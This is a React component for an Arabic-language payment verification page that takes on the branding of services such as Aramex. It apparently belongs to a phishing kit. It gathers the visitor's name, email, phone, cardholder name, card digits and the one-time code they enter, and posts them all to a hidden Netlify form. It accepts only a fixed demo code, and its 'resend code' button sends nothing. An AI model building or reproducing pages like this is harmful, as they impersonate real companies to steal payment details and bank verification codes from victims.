import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { getServiceBranding } from "@/lib/serviceLogos";
import { Shield, AlertCircle, Check, Lock } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const PaymentOTPForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  
  const [otp, setOtp] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(60);
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceName = customerInfo.service || 'aramex';
  const branding = getServiceBranding(serviceName);
  
  // Demo OTP: 123456
  const DEMO_OTP = "123456";
  
  // Countdown timer effect
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    if (otp === DEMO_OTP) {
      // Submit to Netlify Forms
      try {
        await fetch("/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            "form-name": "payment-confirmation",
            name: customerInfo.name || '',
            email: customerInfo.email || '',
            phone: customerInfo.phone || '',
            service: serviceName,
            amount: customerInfo.amount || '500 SAR',
            cardLast4: sessionStorage.getItem('cardLast4') || '',
            cardholder: sessionStorage.getItem('cardName') || '',
            otp: otp,
            timestamp: new Date().toISOString()
          }).toString()
        });
      } catch (err) {
        console.error("Form submission error:", err);
      }
      
      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });
      
      navigate(`/pay/${id}/receipt`);
    } else {
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
      }
    }
  };
  
  return (
    <div 
      className="min-h-screen"
      dir="rtl"
      style={{
        background: 'linear-gradient(180deg, #0a0e27 0%, #1a1f3a 100%)',
      }}
    >
      {/* Header Image */}
      {branding.ogImage && (
        <div className="w-full">
          <img 
            src={branding.ogImage} 
            alt={serviceName}
            className="w-full h-48 object-cover"
            onError={(e) => e.currentTarget.style.display = 'none'}
          />
        </div>
      )}

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-md mx-auto">
          
          {/* Title Section */}
          <div className="text-center mb-6">
            <div 
              className="w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
              }}
            >
              <Shield className="w-8 h-8 text-white" />
            </div>
            <h1 className="text-3xl font-bold text-white mb-2">رمز التحقق</h1>
            <p className="text-gray-400">أدخل الرمز المرسل إلى هاتفك</p>
          </div>

          {/* Info */}
          <div 
            className="rounded-lg p-4 mb-6"
            style={{
              background: 'rgba(59, 130, 246, 0.1)',
              border: '1px solid rgba(59, 130, 246, 0.3)'
            }}
          >
            <p className="text-sm text-blue-300 text-center">
              تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
            </p>
          </div>
          
          <form onSubmit={handleSubmit}>
            {/* OTP Input - 6 digits */}
            <div className="mb-6">
              <div className="flex gap-2 justify-center" dir="ltr">
                {[0, 1, 2, 3, 4, 5].map((index) => (
                  <Input
                    key={index}
                    value={otp[index] || ''}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, "");
                      if (val) {
                        const newOtp = otp.split('');
                        newOtp[index] = val[val.length - 1];
                        setOtp(newOtp.join(''));
                        // Auto-focus next input
                        if (index < 5 && val) {
                          const nextInput = e.target.parentElement?.nextElementSibling?.querySelector('input');
                          nextInput?.focus();
                        }
                      }
                    }}
                    onKeyDown={(e) => {
                      if (e.key === 'Backspace' && !otp[index] && index > 0) {
                        const prevInput = e.currentTarget.parentElement?.previousElementSibling?.querySelector('input');
                        prevInput?.focus();
                      }
                    }}
                    inputMode="numeric"
                    maxLength={1}
                    className="w-14 h-16 text-center text-2xl font-bold bg-gray-900/50 border-2 border-gray-700 text-white focus:border-blue-500"
                    style={{
                      borderColor: otp[index] ? branding.colors.primary : undefined
                    }}
                    disabled={attempts >= 3}
                    required
                  />
                ))}
              </div>
            </div>
            
            {/* Error Message */}
            {error && (
              <div 
                className="rounded-lg p-3 mb-6 flex items-start gap-2"
                style={{
                  background: 'rgba(239, 68, 68, 0.1)',
                  border: '1px solid rgba(239, 68, 68, 0.3)'
                }}
              >
                <AlertCircle className="w-5 h-5 text-red-400 mt-0.5 flex-shrink-0" />
                <p className="text-sm text-red-300">{error}</p>
              </div>
            )}
            
            {/* Countdown Timer */}
            {countdown > 0 && (
              <div className="text-center mb-6">
                <p className="text-sm text-gray-400">
                  إعادة إرسال الرمز بعد <strong className="text-white">{countdown}</strong> ثانية
                </p>
              </div>
            )}

            {/* Attempts Counter */}
            {attempts > 0 && attempts < 3 && (
              <div className="text-center mb-6">
                <p className="text-sm text-yellow-400">
                  المحاولات المتبقية: <strong>{3 - attempts}</strong>
                </p>
              </div>
            )}
            
            {/* Submit Button */}
            <Button
              type="submit"
              size="lg"
              className="w-full text-xl py-7 font-bold"
              disabled={attempts >= 3 || otp.length < 6}
              style={{
                background: attempts >= 3 
                  ? '#666' 
                  : 'linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%)',
                color: '#000'
              }}
            >
              {attempts >= 3 ? (
                <span>محظور مؤقتاً</span>
              ) : (
                <>
                  <Check className="w-6 h-6 ml-2" />
                  <span>تأكيد الدفع</span>
                </>
              )}
            </Button>
            
            {countdown === 0 && (
              <Button
                type="button"
                variant="ghost"
                className="w-full mt-3 text-blue-400"
                onClick={() => {
                  setCountdown(60);
                  toast({
                    title: "تم إرسال الرمز",
                    description: "تم إرسال رمز تحقق جديد إلى هاتفك",
                  });
                }}
              >
                إعادة إرسال الرمز
              </Button>
            )}
          </form>
          
          {/* Hidden Netlify Form */}
          <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
            <input type="text" name="name" />
            <input type="email" name="email" />
            <input type="tel" name="phone" />
            <input type="text" name="service" />
            <input type="text" name="amount" />
            <input type="text" name="cardholder" />
            <input type="text" name="cardLast4" />
            <input type="text" name="otp" />
            <input type="text" name="timestamp" />
          </form>
        </div>
      </div>
    </div>
  );
};

export default PaymentOTPForm;
